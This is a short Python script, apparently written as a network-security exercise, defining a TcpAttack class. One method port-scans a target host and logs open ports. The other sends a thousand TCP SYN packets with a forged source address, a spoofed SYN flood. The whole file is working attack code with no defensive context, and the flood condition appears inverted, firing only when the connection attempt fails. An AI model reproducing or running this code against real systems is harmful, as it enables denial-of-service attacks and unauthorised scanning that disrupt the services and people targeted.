#! /usr/bin/env python

import socket
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        fout = open("openports.txt", "w+")
        targetIP = socket.gethostbyname(self.targetIP)
        spoofIP = socket.gethostbyname(self.spoofIP)
        for port in range(rangeStart, rangeEnd+1):
            tempsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tempsock.settimeout(1)
            conn = tempsock.connect_ex((targetIP, port))
            if conn == 0:
                tmps = "Available port found: "+str(port)+"\n"
                fout.write(tmps)
                tempsock.close()
            else:
                print "Port "+str(port)+" is closed."
        fout.close()
    

    def attackTarget(self, port):
        tempsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tempsock.settimeout(1)
        spoofIP = socket.gethostbyname(self.spoofIP)
        targetIP = socket.gethostbyname(self.targetIP)
        conn = tempsock.connect_ex((targetIP, port))
        if conn:
            temp = IP(src=spoofIP, dst=targetIP)/TCP(dport=port, flags='S')
            for i in range(0,1000):
                send(temp)
            return 1
        else:
            return 0
